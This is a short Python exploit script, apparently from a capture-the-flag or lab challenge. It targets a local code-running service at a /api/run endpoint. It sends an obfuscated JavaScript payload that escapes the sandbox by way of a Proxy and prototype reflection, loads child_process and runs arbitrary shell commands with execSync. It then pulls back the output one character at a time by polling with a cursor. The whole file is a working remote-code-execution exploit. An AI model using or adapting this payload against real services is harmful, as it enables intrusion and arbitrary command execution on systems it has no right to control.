import requests
import json

URL = "http://127.0.0.1:41715"
SID = "29888e2f02c32acc6016066350784122"

def run_cmd(cmd):
    payload = f'new Proxy({{}},{{get(){{return function(a){{b=Reflect.ownKeys(a.__proto__)[4];c=a[b](decodeURI("return %70rocess"))();return a(c.mainModule[b]._load(decodeURI("child_%70rocess")).execSync("{cmd}"))}}}}}})'
    
    r = requests.post(f"{URL}/api/run",
                      headers={"X-Session-Id": SID, "Content-Type": "application/json"},
                      json={"code": payload})
    
    if r.status_code != 204:
        print(f"Error: {r.status_code} - {r.text}")
        return None
    
    result = ""
    cursor = 0
    while True:
        r = requests.get(f"{URL}/api/run",
                         headers={"X-Session-Id": SID},
                         params={"cursor": cursor})
        char = r.json().get("char", "")
        if not char:
            break
        result += char
        cursor += 1
    return result


print(run_cmd("which python"))